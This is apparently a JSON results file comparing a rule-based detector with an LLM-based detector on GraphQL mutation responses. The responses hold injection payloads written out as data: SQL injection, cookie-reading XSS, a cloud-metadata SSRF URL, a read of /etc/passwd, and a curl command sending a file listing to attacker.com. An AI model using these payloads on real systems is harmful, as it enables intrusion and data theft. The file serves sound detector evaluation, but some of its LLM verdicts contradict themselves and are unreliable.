{
  "report_timestamp": "2025-10-05T15:13:53.156000",
  "api_url": "https://graphqlzero.almansi.me/api",
  "summary": {
    "total_comparisons": 10,
    "agreement_rate": 0.5,
    "simple_detections": 6,
    "llm_detections": 7,
    "consensus_breakdown": {
      "both_detected": 6,
      "llm_only": 1,
      "no_vulnerabilities": 3
    },
    "detection_ratio": 1.1666666666666667,
    "potential_analysis": {
      "potential_agreement_rate": 0.0,
      "simple_potential_detections": 5,
      "llm_potential_detections": 0,
      "potential_consensus_breakdown": {
        "simple_potential_only": 5,
        "no_potential": 5
      },
      "potential_detection_ratio": 0.0
    }
  },
  "detailed_comparisons": [
    {
      "timestamp": "2025-10-05T15:10:56.675770",
      "node_name": "updatePhoto_response_2",
      "response_status": 200,
      "response_body": {
        "data": {
          "updatePhoto": {
            "id": "1",
            "title": "Sunset' OR 1=1-- "
          }
        }
      },
      "simple_detector": {
        "results": [
          {
            "detection_name": "SQL Injection (SQLi) Injection",
            "detection": "potential",
            "category": "Injection Attacks",
            "description": "SQL injection vulnerability detected - malicious SQL patterns found in response",
            "evidence": "Response status: 200, SQL patterns detected in response"
          }
        ],
        "count": 1,
        "vulnerable_count": 0,
        "potential_count": 1,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": [
          "Injection Attacks"
        ]
      },
      "llm_detector": {
        "results": [
          {
            "detection_name": "LLM: sql_injection",
            "detection": "vulnerable",
            "category": "Injection Attacks",
            "description": "The mutation response contains the payload 'Sunset' OR 1=1-- ', which includes a single quote (') followed by a boolean logic clause (OR 1=1) and a SQL comment delimiter (--). This is a common SQL injection pattern used to manipulate or bypass database queries. The inclusion of this payload in a mutation input field strongly suggests unsanitized user input that could allow attackers to alter SQL queries. While there is no direct evidence of database errors or data leaks in the response, the presence of a deliberate SQL syntax payload in a successful GraphQL response (200 status code) indicates a high likelihood of insufficient input sanitization and SQL injection vulnerability.",
            "evidence": "title: 'Sunset' OR 1=1-- ' in updatePhoto mutation response",
            "confidence": 0.85,
            "llm_analysis": {
              "is_vulnerable": true,
              "vulnerability_type": "sql_injection",
              "severity": "CRITICAL",
              "confidence": 0.85,
              "evidence": "title: 'Sunset' OR 1=1-- ' in updatePhoto mutation response",
              "explanation": "The mutation response contains the payload 'Sunset' OR 1=1-- ', which includes a single quote (') followed by a boolean logic clause (OR 1=1) and a SQL comment delimiter (--). This is a common SQL injection pattern used to manipulate or bypass database queries. The inclusion of this payload in a mutation input field strongly suggests unsanitized user input that could allow attackers to alter SQL queries. While there is no direct evidence of database errors or data leaks in the response, the presence of a deliberate SQL syntax payload in a successful GraphQL response (200 status code) indicates a high likelihood of insufficient input sanitization and SQL injection vulnerability."
            }
          }
        ],
        "count": 1,
        "vulnerable_count": 1,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [
          "Injection Attacks"
        ],
        "common_categories": [
          "Injection Attacks"
        ],
        "simple_unique_categories": [],
        "llm_unique_categories": [],
        "agreement_score": 1.0,
        "consensus": "both_detected",
        "potential_analysis": {
          "total_potential_categories": [
            "Injection Attacks"
          ],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [
            "Injection Attacks"
          ],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "simple_potential_only"
        }
      }
    },
    {
      "timestamp": "2025-10-05T15:11:01.194283",
      "node_name": "updatePhoto_response_3",
      "response_status": 200,
      "response_body": {
        "data": {
          "updatePhoto": {
            "id": "1",
            "title": "<script>alert(document.cookie)</script>"
          }
        }
      },
      "simple_detector": {
        "results": [
          {
            "detection_name": "Cross-Site Scripting (XSS) Injection",
            "detection": "potential",
            "category": "Injection Attacks",
            "description": "XSS injection vulnerability detected - malicious script patterns found in response",
            "evidence": "Response status: 200, XSS patterns detected in response data"
          }
        ],
        "count": 1,
        "vulnerable_count": 0,
        "potential_count": 1,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": [
          "Injection Attacks"
        ]
      },
      "llm_detector": {
        "results": [
          {
            "detection_name": "LLM: xss_injection",
            "detection": "vulnerable",
            "category": "Injection Attacks",
            "description": "The response contains a stored XSS payload in the 'title' field (<script>alert(document.cookie)</script>). This demonstrates that user-supplied HTML/script input is persisted and returned un-sanitized by the API, which could be executed in a client's browser if rendered without proper escaping. The payload directly accesses document.cookie, indicating session hijacking potential.",
            "evidence": "title: \"<script>alert(document.cookie)</script>\"",
            "confidence": 0.95,
            "llm_analysis": {
              "is_vulnerable": true,
              "vulnerability_type": "xss_injection",
              "severity": "HIGH",
              "confidence": 0.95,
              "evidence": "title: \"<script>alert(document.cookie)</script>\"",
              "explanation": "The response contains a stored XSS payload in the 'title' field (<script>alert(document.cookie)</script>). This demonstrates that user-supplied HTML/script input is persisted and returned un-sanitized by the API, which could be executed in a client's browser if rendered without proper escaping. The payload directly accesses document.cookie, indicating session hijacking potential."
            }
          }
        ],
        "count": 1,
        "vulnerable_count": 1,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [
          "Injection Attacks"
        ],
        "common_categories": [
          "Injection Attacks"
        ],
        "simple_unique_categories": [],
        "llm_unique_categories": [],
        "agreement_score": 1.0,
        "consensus": "both_detected",
        "potential_analysis": {
          "total_potential_categories": [
            "Injection Attacks"
          ],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [
            "Injection Attacks"
          ],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "simple_potential_only"
        }
      }
    },
    {
      "timestamp": "2025-10-05T15:11:06.841991",
      "node_name": "updatePhoto_response_4",
      "response_status": 200,
      "response_body": {
        "data": {
          "updatePhoto": {
            "id": "1",
            "url": "http://169.254.169.254/latest/meta-data/"
          }
        }
      },
      "simple_detector": {
        "results": [
          {
            "detection_name": "Server-Side Request Forgery (SSRF) Injection",
            "detection": "potential",
            "category": "Injection Attacks",
            "description": "SSRF injection vulnerability detected - internal network access patterns found",
            "evidence": "Response status: 200, SSRF keywords detected in response"
          }
        ],
        "count": 1,
        "vulnerable_count": 0,
        "potential_count": 1,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": [
          "Injection Attacks"
        ]
      },
      "llm_detector": {
        "results": [
          {
            "detection_name": "LLM: ssrf_injection",
            "detection": "vulnerable",
            "category": "Injection Attacks",
            "description": "The response contains a URL pointing to '169.254.169.254', a well-known internal AWS metadata service endpoint. This IP address is accessible only from within cloud instances and is a common SSRF target to retrieve sensitive cloud metadata. The presence of this URL in the response suggests the server may have processed a user-controlled input to access internal resources, indicating potential SSRF vulnerability.",
            "evidence": "url: 'http://169.254.169.254/latest/meta-data/'",
            "confidence": 0.95,
            "llm_analysis": {
              "is_vulnerable": true,
              "vulnerability_type": "ssrf_injection",
              "severity": "CRITICAL",
              "confidence": 0.95,
              "evidence": "url: 'http://169.254.169.254/latest/meta-data/'",
              "explanation": "The response contains a URL pointing to '169.254.169.254', a well-known internal AWS metadata service endpoint. This IP address is accessible only from within cloud instances and is a common SSRF target to retrieve sensitive cloud metadata. The presence of this URL in the response suggests the server may have processed a user-controlled input to access internal resources, indicating potential SSRF vulnerability."
            }
          }
        ],
        "count": 1,
        "vulnerable_count": 1,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [
          "Injection Attacks"
        ],
        "common_categories": [
          "Injection Attacks"
        ],
        "simple_unique_categories": [],
        "llm_unique_categories": [],
        "agreement_score": 1.0,
        "consensus": "both_detected",
        "potential_analysis": {
          "total_potential_categories": [
            "Injection Attacks"
          ],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [
            "Injection Attacks"
          ],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "simple_potential_only"
        }
      }
    },
    {
      "timestamp": "2025-10-05T15:11:25.744403",
      "node_name": "updatePhoto_response_5",
      "response_status": 200,
      "response_body": {
        "data": {
          "updatePhoto": {
            "id": "1",
            "url": "https://example.com; curl http://attacker.com/$(ls | base64)"
          }
        }
      },
      "simple_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "llm_detector": {
        "results": [
          {
            "detection_name": "LLM: os_command_injection",
            "detection": "vulnerable",
            "category": "Injection Attacks",
            "description": "The URL field in the GraphQL response contains a semicolon followed by a 'curl' command with command substitution ($(ls | base64)), indicating potential shell command execution. The semicolon (;) allows command chaining in Unix shells, and the $(...) syntax executes subshells. This payload suggests an attacker is attempting to list local files (ls), encode them in base64, and exfiltrate the data via an external HTTP request, which is a clear indicator of OS command injection if the server processes the URL input unsafely.",
            "evidence": "url: 'https://example.com; curl http://attacker.com/$(ls | base64)'",
            "confidence": 0.95,
            "llm_analysis": {
              "is_vulnerable": true,
              "vulnerability_type": "os_command_injection",
              "severity": "CRITICAL",
              "confidence": 0.95,
              "evidence": "url: 'https://example.com; curl http://attacker.com/$(ls | base64)'",
              "explanation": "The URL field in the GraphQL response contains a semicolon followed by a 'curl' command with command substitution ($(ls | base64)), indicating potential shell command execution. The semicolon (;) allows command chaining in Unix shells, and the $(...) syntax executes subshells. This payload suggests an attacker is attempting to list local files (ls), encode them in base64, and exfiltrate the data via an external HTTP request, which is a clear indicator of OS command injection if the server processes the URL input unsafely."
            }
          }
        ],
        "count": 1,
        "vulnerable_count": 1,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [
          "Injection Attacks"
        ],
        "common_categories": [],
        "simple_unique_categories": [],
        "llm_unique_categories": [
          "Injection Attacks"
        ],
        "agreement_score": 0.0,
        "consensus": "llm_only",
        "potential_analysis": {
          "total_potential_categories": [],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "no_potential"
        }
      }
    },
    {
      "timestamp": "2025-10-05T15:11:47.153616",
      "node_name": "updatePhoto_response_6",
      "response_status": 200,
      "response_body": {
        "data": {
          "updatePhoto": {
            "id": "1",
            "url": "file:///etc/passwd"
          }
        }
      },
      "simple_detector": {
        "results": [
          {
            "detection_name": "Path Injection",
            "detection": "potential",
            "category": "Injection Attacks",
            "description": "Path injection vulnerability detected - file system access patterns found",
            "evidence": "Response status: 200, Path injection patterns detected in response"
          }
        ],
        "count": 1,
        "vulnerable_count": 0,
        "potential_count": 1,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": [
          "Injection Attacks"
        ]
      },
      "llm_detector": {
        "results": [
          {
            "detection_name": "LLM: path_injection",
            "detection": "vulnerable",
            "category": "Injection Attacks",
            "description": "The response contains a 'file://' URI scheme pointing to /etc/passwd, a sensitive system file. This indicates the application accepts arbitrary local file paths in user-controllable input, potentially enabling unauthorized file system access through path manipulation. In GraphQL context, this suggests the updatePhoto operation might lack proper input validation for file paths.",
            "evidence": "url: 'file:///etc/passwd'",
            "confidence": 0.95,
            "llm_analysis": {
              "is_vulnerable": true,
              "vulnerability_type": "path_injection",
              "severity": "CRITICAL",
              "confidence": 0.95,
              "evidence": "url: 'file:///etc/passwd'",
              "explanation": "The response contains a 'file://' URI scheme pointing to /etc/passwd, a sensitive system file. This indicates the application accepts arbitrary local file paths in user-controllable input, potentially enabling unauthorized file system access through path manipulation. In GraphQL context, this suggests the updatePhoto operation might lack proper input validation for file paths."
            }
          }
        ],
        "count": 1,
        "vulnerable_count": 1,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [
          "Injection Attacks"
        ],
        "common_categories": [
          "Injection Attacks"
        ],
        "simple_unique_categories": [],
        "llm_unique_categories": [],
        "agreement_score": 1.0,
        "consensus": "both_detected",
        "potential_analysis": {
          "total_potential_categories": [
            "Injection Attacks"
          ],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [
            "Injection Attacks"
          ],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "simple_potential_only"
        }
      }
    },
    {
      "timestamp": "2025-10-05T15:11:56.305171",
      "node_name": "updatePhoto_response_7",
      "response_status": 200,
      "response_body": {
        "data": {
          "updatePhoto": {
            "id": "1",
            "title": "<img src='x' onerror='alert(1)'>"
          }
        }
      },
      "simple_detector": {
        "results": [
          {
            "detection_name": "HTML Injection",
            "detection": "potential",
            "category": "Injection Attacks",
            "description": "HTML injection vulnerability detected - HTML markup found in response",
            "evidence": "Response status: 200, HTML patterns detected in response data"
          }
        ],
        "count": 1,
        "vulnerable_count": 0,
        "potential_count": 1,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": [
          "Injection Attacks"
        ]
      },
      "llm_detector": {
        "results": [
          {
            "detection_name": "LLM: html_injection",
            "detection": "vulnerable",
            "category": "Injection Attacks",
            "description": "The response contains unsanitized HTML markup (`<img>` tag with an `onerror` event handler) in the 'title' field. If this value is rendered directly in a browser without proper escaping/sanitization, it could execute arbitrary JavaScript (XSS) or inject unintended HTML content. While this is technically an XSS vector, it falls under HTML injection as the payload is stored HTML markup.",
            "evidence": "<img src='x' onerror='alert(1)'> in the 'title' field",
            "confidence": 0.9,
            "llm_analysis": {
              "is_vulnerable": true,
              "vulnerability_type": "html_injection",
              "severity": "HIGH",
              "confidence": 0.9,
              "evidence": "<img src='x' onerror='alert(1)'> in the 'title' field",
              "explanation": "The response contains unsanitized HTML markup (`<img>` tag with an `onerror` event handler) in the 'title' field. If this value is rendered directly in a browser without proper escaping/sanitization, it could execute arbitrary JavaScript (XSS) or inject unintended HTML content. While this is technically an XSS vector, it falls under HTML injection as the payload is stored HTML markup."
            }
          }
        ],
        "count": 1,
        "vulnerable_count": 1,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [
          "Injection Attacks"
        ],
        "common_categories": [
          "Injection Attacks"
        ],
        "simple_unique_categories": [],
        "llm_unique_categories": [],
        "agreement_score": 1.0,
        "consensus": "both_detected",
        "potential_analysis": {
          "total_potential_categories": [
            "Injection Attacks"
          ],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [
            "Injection Attacks"
          ],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "simple_potential_only"
        }
      }
    },
    {
      "timestamp": "2025-10-05T15:12:49.946071",
      "node_name": "updatePhoto_response_8",
      "response_status": null,
      "response_body": null,
      "simple_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "llm_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [],
        "common_categories": [],
        "simple_unique_categories": [],
        "llm_unique_categories": [],
        "agreement_score": 0.0,
        "consensus": "no_vulnerabilities",
        "potential_analysis": {
          "total_potential_categories": [],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "no_potential"
        }
      }
    },
    {
      "timestamp": "2025-10-05T15:13:15.602774",
      "node_name": "updatePhoto_response_9",
      "response_status": null,
      "response_body": null,
      "simple_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "llm_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [],
        "common_categories": [],
        "simple_unique_categories": [],
        "llm_unique_categories": [],
        "agreement_score": 0.0,
        "consensus": "no_vulnerabilities",
        "potential_analysis": {
          "total_potential_categories": [],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "no_potential"
        }
      }
    },
    {
      "timestamp": "2025-10-05T15:13:47.739668",
      "node_name": "updatePhoto_response_10",
      "response_status": 400,
      "response_body": {
        "errors": [
          {
            "message": "Cannot query field \"updatePhoto\" on type \"Query\".",
            "locations": [
              {
                "line": 3,
                "column": 3
              }
            ],
            "extensions": {
              "code": "GRAPHQL_VALIDATION_FAILED"
            }
          }
        ]
      },
      "simple_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "llm_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [],
        "common_categories": [],
        "simple_unique_categories": [],
        "llm_unique_categories": [],
        "agreement_score": 0.0,
        "consensus": "no_vulnerabilities",
        "potential_analysis": {
          "total_potential_categories": [],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "no_potential"
        }
      }
    },
    {
      "timestamp": "2025-10-05T15:13:53.154933",
      "node_name": "updatePhoto_response_11",
      "response_status": 400,
      "response_body": {
        "errors": [
          {
            "message": "Field \"titl\" is not defined by type \"UpdatePhotoInput\". Did you mean \"title\"?",
            "locations": [
              {
                "line": 3,
                "column": 32
              }
            ],
            "extensions": {
              "code": "GRAPHQL_VALIDATION_FAILED"
            }
          }
        ]
      },
      "simple_detector": {
        "results": [
          {
            "detection_name": "Field Suggestions Enabled",
            "detection": "vulnerable",
            "category": "Information Disclosure",
            "description": "Field suggestions enabled - potential information disclosure",
            "evidence": "Found \"did you mean\" in error message - field suggestions are enabled"
          }
        ],
        "count": 1,
        "vulnerable_count": 1,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [
          "Information Disclosure"
        ],
        "potential_categories": []
      },
      "llm_detector": {
        "results": [
          {
            "detection_name": "LLM: field_suggestions",
            "detection": "safe",
            "category": "Unknown",
            "description": "The server's error response explicitly suggests a valid field name ('title') when an invalid one ('titl') is provided. While helpful for developers, this behavior exposes schema details that could aid attackers in reconnaissance by revealing valid field names. However, the risk is limited to information disclosure rather than direct exploitation.",
            "evidence": "Did you mean \"title\"?",
            "confidence": 0.95,
            "llm_analysis": {
              "is_vulnerable": true,
              "vulnerability_type": "field_suggestions",
              "severity": "LOW",
              "confidence": 0.95,
              "evidence": "Did you mean \"title\"?",
              "explanation": "The server's error response explicitly suggests a valid field name ('title') when an invalid one ('titl') is provided. While helpful for developers, this behavior exposes schema details that could aid attackers in reconnaissance by revealing valid field names. However, the risk is limited to information disclosure rather than direct exploitation."
            }
          }
        ],
        "count": 1,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 1,
        "categories": [
          "Unknown"
        ],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [
          "Information Disclosure",
          "Unknown"
        ],
        "common_categories": [],
        "simple_unique_categories": [
          "Information Disclosure"
        ],
        "llm_unique_categories": [
          "Unknown"
        ],
        "agreement_score": 0.0,
        "consensus": "both_detected",
        "potential_analysis": {
          "total_potential_categories": [],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "no_potential"
        }
      }
    }
  ],
  "detector_analysis": {
    "simple_detector": {
      "description": "Rule-based detector using predefined patterns",
      "strengths": [
        "Fast execution",
        "Consistent results",
        "Low resource usage"
      ],
      "weaknesses": [
        "Limited to known patterns",
        "May miss novel attacks",
        "False negatives possible"
      ]
    },
    "llm_detector": {
      "description": "AI-powered detector using language model analysis",
      "strengths": [
        "Contextual understanding",
        "Novel attack detection",
        "Detailed analysis"
      ],
      "weaknesses": [
        "Slower execution",
        "Resource intensive",
        "Potential false positives"
      ]
    }
  }
}